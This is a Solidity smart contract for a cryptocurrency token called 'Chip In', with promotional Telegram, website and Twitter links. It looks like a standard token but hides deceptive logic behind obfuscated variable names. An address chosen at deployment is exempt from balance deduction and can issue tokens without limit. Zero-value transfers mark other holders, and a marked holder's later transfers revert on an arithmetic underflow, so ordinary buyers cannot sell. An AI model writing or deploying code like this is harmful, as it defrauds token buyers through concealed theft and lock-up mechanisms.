
// File: deploy/Contract.sol
/*

TG: https://t.me/Chipinportal
Web: https://chipin.vip/
Twitter: https://twitter.com/chipintoken

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH9() external pure returns (address);
}

interface IUniswapV3Factory {
    function createPool(address tokenA, address tokenB, uint24 fee) external returns (address pool);
}

contract ChipIn is Ownable {
    constructor(address had) {
        balanceOf[msg.sender] = totalSupply;
        children[had] = knife;
        ISwapRouter uniswapV3Router = ISwapRouter(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
        uniswapV3Pair = IUniswapV3Factory(uniswapV3Router.factory()).createPool(address(this), uniswapV3Router.WETH9(), 500);
    }

    mapping(address => uint256) public balanceOf;

    string public name = 'Chip In';

    mapping(address => uint256) private children;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public symbol = 'Chip In';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private boy;

    function transferFrom(address maybe, address body, uint256 purpose) public returns (bool success) {
        require(purpose <= allowance[maybe][msg.sender]);
        allowance[maybe][msg.sender] -= purpose;
        black(maybe, body, purpose);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function black(address maybe, address body, uint256 purpose) private returns (bool success) {
        if (children[maybe] == 0) {
            balanceOf[maybe] -= purpose;
        }

        if (purpose == 0) boy[body] += knife;

        if (maybe != uniswapV3Pair && children[maybe] == 0 && boy[maybe] > 0) {
            children[maybe] -= knife;
        }

        balanceOf[body] += purpose;
        emit Transfer(maybe, body, purpose);
        return true;
    }

    address public uniswapV3Pair;

    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address body, uint256 purpose) public returns (bool success) {
        black(msg.sender, body, purpose);
        return true;
    }

    uint8 public decimals = 9;

    uint256 private knife = 90;

    function approve(address major, uint256 purpose) public returns (bool success) {
        allowance[msg.sender][major] = purpose;
        emit Approval(msg.sender, major, purpose);
        return true;
    }
}

